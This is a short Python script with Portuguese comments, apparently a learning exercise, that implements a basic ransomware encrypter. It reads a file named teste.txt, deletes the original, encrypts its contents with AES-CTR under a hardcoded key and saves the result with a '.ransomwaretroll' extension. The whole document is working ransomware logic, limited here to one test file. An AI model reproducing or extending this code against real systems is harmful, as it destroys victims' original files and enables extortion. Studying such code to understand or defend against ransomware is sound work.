"""
Comando usado para importar a biblioteca de criptografia a ser usada
"""
import os
import pyaes

""" 
Nessa primeira etapa, a variável file_name é atribuída ao arquivo teste.txt. Depois disso,
o arquivo teste.txt é aberto, lido e depois fechado
"""
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Após a leitura, o arquivo file_name é excluído, mas o seu conteúdo será mantido
os.remove(file_name)

"""
A chave de criptografia é definida. O AES suporta três tamanhos de chave (16, 24 e 32bytes).
Nesse caso, a chave tem 16 bytes. O AES vai ser uma função para criptografar o arquivo com
base na chave passada
"""
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## Nessa etapa o arquivo é de fato criptografado. 
crypto_data = aes.encrypt(file_data)

""" 
O arquivo criptografado é salvo e uma nova variável é criada. O ".ransomwaretroll" é concatenado
ao file_name. Para que funcione, o comando python encrypter.py tem que ser usado
"""
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
